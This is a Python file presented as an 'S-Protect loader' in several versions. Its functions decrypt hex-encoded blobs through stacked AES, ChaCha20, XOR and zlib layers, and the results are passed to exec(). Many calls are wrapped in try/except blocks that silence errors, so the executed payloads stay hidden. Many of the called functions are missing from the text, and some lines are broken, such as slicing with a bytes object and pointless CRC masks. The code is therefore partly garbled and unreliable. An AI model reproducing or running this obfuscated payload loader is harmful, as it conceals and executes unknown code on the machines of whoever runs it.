'S-Protect loader v2.2.'

def _yf750a708():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('3f257ebc1321aeb9376bcfd8410ac8a1d45633ef5647406379462eb79797e6522aeab308')
        _d = bytes.fromhex('da2a3c85568a8c397114c70b19032dbdd81e62178d8b66256a377e4d99631714057e7e9038f95ccde99f5100a3b9ba1b1c29e5d62c3d471877f16f9675b1270b4f54d3d983dd84342227')
        _c = Cipher(algorithms.AES(_k), modes.CTR(_d[:16])).decryptor()
        _x = _c.update(_d[16:]) + _c.finalize()
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != 'c7cfa81b':
            _x = _x[::-1]
        _r = zlib.decompress(_x)
    except Exception as __mec1acd7a:
        _r = b''
    return _r

def _k68d7dc36():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('be99d38fe45ea62811abc6d09006dea4d81c025c34c0d57daf75aa55d5b6d0a424a610806196d1')
        _d = bytes.fromhex('569dfb26b98aef5af458be176ec84eb82663b8d7ba4df5721e5247fb56c4fd4e24f54df1f3ef26411f05b76082087ade2ae197541dc3ed85ff74a123e397feb962c0b81f9de84d0eb4de852c25ff4979938e2538868b8ed1a07dbc4b76ca62c0a8ed82540aa91d11aaf60e3690d6e28a9b43149a90884cfd03')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != '6bca4798':
            _x = _x[::-1]
        _crc = zlib.crc32(_x) & 4000740335
        _r = zlib.decompress(_x)
    except Exception as __adc35b0db:
        _r = b''
    return _r

def _s455d3263():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('2cec7d1600ad42abe3de9b42949867444aa85203adef7857d78bc0e4efaea5f411287e45')
        _d = bytes.fromhex('faf308c9647e5bb58b5f8616831108a987cec9146f11bdb1b8037b79adcdcd26ec8f075c73d5d180a57c60fcefed0ced6f72b919324663eef3465c3ed308b4045e56808580fbc9649efd4c236d6b5077de54fdf9f9169bedd53629f501a547535305adfdfcac0de831492c47c4a566c84fb039c919d913f452')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        _r = zlib.decompress(_x)
    except Exception as __k837852f9:
        _r = b''
    return _r

def _d1fb61b6d():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('1046eeb554f664a15fb49321d1a93c0097451a4ac388193e67617fff46dd4900ad')
        _d = bytes.fromhex('057e8e868f59f8d45fa41de55595c14ae464118ea398a1a2f8a90e8a035e0e1e2ebf8a86a328526d8359f57b92c67ecf177ce33b69b30c4c51ea4aa71867f6562a8c466d9c916559e03e72fb04219a51b4fe0ca3a9c64d211f9aa14b7d2d4cc02cc8f20ca544ddbbc5c15b8916cd3a4f5b9a08ef9261cfe59c2de5917fda6aa39a45684a5dff96bb16b2a99993d8e2')
        _c = Cipher(algorithms.AES(_k), modes.CTR(_d[:16])).decryptor()
        _x = _c.update(_d[16:]) + _c.finalize()
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != '04d38565':
            _x = _x[::-1]
        _r = zlib.decompress(_x)
    except Exception as __z5cd01f61:
        _r = b''
    return _r
'Loader v3.3.'

def _aa93fea3a():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('428f6749b710b057d1857797e0a05fda1f1f4d08685092b41727e6381278477d8f54943f1b1f52712f100b02f8c072')
        _d = bytes.fromhex('0bb4a2ee46a9556e7987ec6f8ac3fb2e5654f51be619f9685366af6eaf40e4b567e775521adfbb6267f72e7214defc92de01fb477b6769bc8b809455333a983cb1b5d446cf934b6a506f05792e709a96d00822061fb48bbb0f35')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _r = zlib.decompress(_x)
    except Exception as __n1445b33c:
        _r = b''
    return _r

def _vbb896887():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('248fe5e237ef320a741ad487734a3597bb7ccb0437a9bb1db622c548ad389522d39e39ade5ab14e32f1682')
        _d = bytes.fromhex('6c7ecaf703c790827c68f6d2c9a38c2bd35bf18bfb0dd7a77503083bf1ca885b0fa9120a55f2a2631831c611a7ee6818c14de56aae9052b87349')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        _crc = zlib.crc32(_x) & 2646004289
        _r = zlib.decompress(_x)
    except Exception as __z9e39ce99:
        _r = b''
    return _r
'S-Protect loader v1.8.'

def _wc43d386c():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('b0a812b2b003786521081f077e8a4288c08e91f74268e5c3e78099c75ac8825c60a75b')
        _d = bytes.fromhex('ec5f4528f2a6124b9aa9344ddc7abbad67d9966805070b8d3b6a866373ab76a75d73c39e31420dbf8814d1feecdc54b79bd0fa5e32d17680f1a8fbb864113a96bccc9cdd7125bb03e897aaf228517ab2d315e434b07efe5b74f5')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != '3dfcc62e':
            _x = _x[::-1]
        _crc = zlib.crc32(_x) & 2712999436
        _r = zlib.decompress(_x)
    except Exception as __tfc9b0aca:
        _r = b''
    return _r

def _c1f9d6f6a():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('6fd70e752f1d97801323fc4f05ed70f54b2053e2a8502e917c942c42f92ba3e385d7ea')
        _d = bytes.fromhex('a459a67cfe3251c6b6c8e9735a55cf20b03de1d92bb9fa39ab7e4a178288a20e9b93dfb4ac4e67970fe5d60f0dee67dbce79d6')
        _c = Cipher(algorithms.AES(_k), modes.CTR(_d[:16])).decryptor()
        _x = _c.update(_d[16:]) + _c.finalize()
        _r = zlib.decompress(_x)
    except Exception as __e9b0900f9:
        _r = b''
    return _r
_e = compile(_a07ad3661(), '', 'exec')
exec(_e)
_e = compile(_vdb141867(), '', 'exec')
exec(_e)
_e = compile(_nf4d2360b(), '', 'exec')
exec(_e)
_e = compile(_p6c0644c7(), '', 'exec')
exec(_e)
try:
    _e = compile(_x9ef77c8d(), '', 'exec')
    exec(_e)
except Exception:
    pass
try:
    _e = compile(_a0e31d455(), '', 'exec')
    exec(_e)
except Exception:
    pass
try:
    _e = compile(_cd7cf3885(), '', 'exec')
    exec(_e)
except Exception:
    pass
_e = compile(_q477e4b42(), '', 'exec')
exec(_e)
try:
    _e = compile(_bc1dd3b88(), '', 'exec')
    exec(_e)
except Exception:
    pass
_e = compile(_sc2850e46(), '', 'exec')
exec(_e)
_e = compile(_a0a846edb(), '', 'exec')
exec(_e)
try:
    _e = compile(_v1dd3697d(), '', 'exec')
    exec(_e)
except Exception:
    pass
try:
    _e = compile(_0x80f536b8f0(), '', 'exec')
    exec(_e)
except Exception:
    pass
try:
    _e = compile(_bb68f6894(), '', 'exec')
    exec(_e)
except Exception:
    pass
_e = compile(_d999ba306(), '', 'exec')
exec(_e)
try:
    _e = compile(_k29d8781b(), '', 'exec')
    exec(_e)
except Exception:
    pass
_e = compile(_za989c063(), '', 'exec')
exec(_e)
_e = compile(_pe91c462a(), '', 'exec')
exec(_e)
_e = compile(_z89c9ba1e(), '', 'exec')
exec(_e)
try:
    _e = compile(_mb0cf81e6(), '', 'exec')
    exec(_e)
except Exception:
    pass
_e = compile(_pfa6e3b3e(), '', 'exec')
exec(_e)
_e = compile(_0x90966f5384(), '', 'exec')
exec(_e)
try:
    _e = compile(_wac6c5e4b(), '', 'exec')
    exec(_e)
except Exception:
    pass
try:
    _e = compile(_v66b62ccc(), '', 'exec')
    exec(_e)
except Exception:
    pass
_e = compile(_t23ad7fc3(), '', 'exec')
exec(_e)
_e = compile(_f1481e60f(), '', 'exec')
exec(_e)
_e = compile(_vbf5013a8(), '', 'exec')
exec(_e)
_e = compile(_0xd9ed5a5837(), '', 'exec')
exec(_e)
_e = compile(_yf750a708(), '', 'exec')
exec(_e)
try:
    _e = compile(_fd8304e4a(), '', 'exec')
    exec(_e)
except Exception:
    pass
_e = compile(_z1da56ba1(), '', 'exec')
exec(_e)
_e = compile(_c7ec5b7d7(), '', 'exec')
exec(_e)
_e = compile(_ca5f1e8ea(), '', 'exec')
exec(_e)
try:
    _e = compile(_md5ce68d9(), '', 'exec')
    exec(_e)
except Exception:
    pass
try:
    _e = compile(_va2997419(), '', 'exec')
    exec(_e)
except Exception:
    pass
_e = compile(_y79df0e89(), '', 'exec')
exec(_e)
try:
    _e = compile(_df29af1be(), '', 'exec')
    exec(_e)
except Exception:
    pass
try:
    _e = compile(_0xfa112f37bc(), '', 'exec')
    exec(_e)
except Exception:
    pass
_e = compile(_af94c410c(), '', 'exec')
exec(_e)
_e = compile(_k68d7dc36(), '', 'exec')
exec(_e)
try:
    _e = compile(_s455d3263(), '', 'exec')
    exec(_e)
except Exception:
    pass
_e = compile(_d1fb61b6d(), '', 'exec')
exec(_e)
try:
    _e = compile(_aa93fea3a(), '', 'exec')
    exec(_e)
except Exception:
    pass
try:
    _e = compile(_neca9f62b(), '', 'exec')
    exec(_e)
except Exception:
    pass
try:
    _e = compile(_vbb896887(), '', 'exec')
    exec(_e)
except Exception:
    pass
_e = compile(_wc43d386c(), '', 'exec')
exec(_e)
_e = compile(_c1f9d6f6a(), '', 'exec')
exec(_e)
try:
    _e = compile(_w102afcab(), '', 'exec')
    exec(_e)
except Exception:
    pass
try:
    _e = compile(_zc7e70eb2(), '', 'exec')
    exec(_e)
except Exception:
    pass
try:
    _e = compile(_m0e0ebdf1(), '', 'exec')
    exec(_e)
except Exception:
    pass
try:
    _e = compile(_s0386335a(), '', 'exec')
    exec(_e)
except Exception:
    pass
_e = compile(_x06bc2267(), '', 'exec')
exec(_e)
try:
    _e = compile(_0x0d025a2bb6(), '', 'exec')
    exec(_e)
except Exception:
    pass
_e = compile(_p03a79054(), '', 'exec')
exec(_e)